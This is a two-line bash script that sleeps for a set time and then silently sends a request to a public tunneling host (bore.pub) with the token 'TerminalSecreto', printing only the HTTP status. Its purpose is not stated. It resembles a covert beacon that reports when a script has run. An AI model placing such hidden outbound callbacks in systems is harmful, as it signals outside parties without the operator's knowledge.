#!/bin/bash
sleep ${1:-165};curl -s -o /dev/null -w "%{http_code}\n" -m 15 "http://bore.pub:37682/?t=TerminalSecreto"
